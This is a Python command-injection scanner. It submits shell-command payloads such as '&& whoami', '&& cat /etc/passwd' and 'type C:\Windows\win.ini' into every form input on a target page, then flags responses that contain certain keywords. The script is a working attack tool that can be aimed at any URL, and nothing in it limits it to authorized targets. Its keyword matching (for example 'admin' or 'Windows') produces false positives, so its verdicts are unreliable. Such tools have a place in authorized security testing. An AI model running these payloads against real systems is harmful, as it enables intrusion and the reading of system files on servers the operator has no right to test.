import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

payloads = [
    "{target} && whoami",
    "{target} && id",
    "{target} && uname -a",
    "{target} && ls",
    "{target} && cat /etc/passwd",
    "{target}; whoami",
    "{target} | whoami",
    "{target} `whoami`",
    "{target} && echo vulnerable",
    "{target} && sleep 5",
    "{target} & whoami",
    "{target} & dir",
    "{target} & echo vulnerable",
    "{target} & type C:\\Windows\\win.ini",
    "{target} | whoami",
    "{target} & timeout 5",
    "{target}%26%26whoami",
    "{target}%3Bwhoami",
    "{target}%7Cwhoami",
    "{target}%60whoami%60"
]

keywords = [
    "root", "uid=", "gid=", "Linux", "Windows", "C:\\", "/bin/bash",
    "No such file", "/etc/passwd", "command not found", "sh:",
    "system32", "admin", "whoami", "echo vulnerable"
]

def _safe_text_snippet(text, length=300):
    if not text:
        return ""
    return text[:length].replace('\n', ' ').strip()

def check_cmd_injection(url):
    
    results = {}

    parsed = urlparse(url)
    target = parsed.netloc or parsed.path 

    try:
        page = requests.get(url, timeout=5)
        page.raise_for_status()
    except requests.RequestException as e:
        print(f"Error accessing page: {e}")
        return

    soup = BeautifulSoup(page.text, "lxml")
    forms = soup.find_all("form")
    if not forms:
        print("No form found on the page.")
        return

    for form in forms:
        action = form.get("action", "")
        method = form.get("method", "get").lower()
        submit_url = urljoin(url, action)

        inputs = form.find_all("input")

        for tpl in payloads:

            load = tpl.format(target=target)

            data = {}
            for input_tag in inputs:
                name = input_tag.get("name")
                if name and input_tag.get("type") not in ("submit", "button"):
                    data[name] = load

            test_result = {
                "status_code": None,
                "vulnerable": False,
                "reason": "Request Failed",
                "snippet": ""
            }

            try:
                if method == "post":
                    response = requests.post(submit_url, data=data, timeout=7)
                else:
                    response = requests.get(submit_url, params=data, timeout=7)
                

                if response.status_code == 200:
                    response_text = response.text
                    snippet = _safe_text_snippet(response_text, 300)
                    
                    isPresent = False
                    reason = "No keyword match found"
                    
                    for i in keywords:
                        if i.lower() in response_text.lower():
                            isPresent = True
                            reason = f"Keyword match: '{i}'"
                            break
                    
                    if isPresent:
                        test_result["vulnerable"] = True
                        test_result["reason"] = f"Potential Vulnerability: {reason}"
                    else:
                        test_result["reason"] = "No direct evidence found (Status 200)"

                    test_result["snippet"] = snippet
                else:
                    test_result["reason"] = f"Non-200 Status Code: {response.status_code}"
                    test_result["snippet"] = _safe_text_snippet(response.text, 300)

            except requests.RequestException as e:
                test_result["reason"] = f"Request Error: {e}"

            results[load] = test_result

    return results

